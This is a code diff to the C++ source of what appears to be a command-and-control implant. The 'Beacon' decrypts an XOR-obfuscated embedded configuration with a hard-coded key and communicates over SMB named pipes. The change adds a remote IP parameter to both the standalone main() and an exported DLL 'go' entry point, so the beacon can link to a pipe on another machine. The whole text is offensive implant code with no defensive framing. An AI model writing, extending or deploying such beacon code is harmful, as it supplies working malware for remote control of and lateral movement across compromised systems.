@@ -8,16 +8,20 @@ using namespace std;
 
 int main(int argc, char* argv[])
 {	
+    std::string ip = "localhost";
 	std::string pipeName = "mynamedpipe";
-	if(argc > 1)
-		pipeName = argv[1];
+	if(argc > 2)
+    {
+		ip = argv[1];
+        pipeName = argv[2];
+    }
 
 	std::string configDecrypt(std::begin(_EncryptedBeaconHttpConfig_), std::end(_EncryptedBeaconHttpConfig_));
     std::string keyConfig(std::begin(_KeyConfig_), std::end(_KeyConfig_));
     XOR(configDecrypt, keyConfig);
 
 	std::unique_ptr<Beacon> beacon;
-	beacon = make_unique<BeaconSmb>(configDecrypt, pipeName);
+	beacon = make_unique<BeaconSmb>(configDecrypt, ip, pipeName);
 
 	beacon->run();
 }
@@ -39,16 +43,17 @@ extern "C" __declspec(dllexport) int go(PCHAR argv)
     // OutputDebugStringA(splitedCmd[1].c_str());
     // OutputDebugStringA(splitedCmd[2].c_str());
 
-    if (splitedCmd.size() == 1)
+    if (splitedCmd.size() == 2)
     {
-        std::string pipeName = splitedCmd[0];
+        std::string ip = splitedCmd[0];
+        std::string pipeName = splitedCmd[1];
 
         std::string configDecrypt(std::begin(_EncryptedBeaconHttpConfig_), std::end(_EncryptedBeaconHttpConfig_));
         std::string keyConfig(std::begin(_KeyConfig_), std::end(_KeyConfig_));
         XOR(configDecrypt, keyConfig);
 
 		std::unique_ptr<Beacon> beacon;
-		beacon = make_unique<BeaconSmb>(configDecrypt, pipeName);
+		beacon = make_unique<BeaconSmb>(configDecrypt, ip, pipeName);
 
 		beacon->run();
 	}
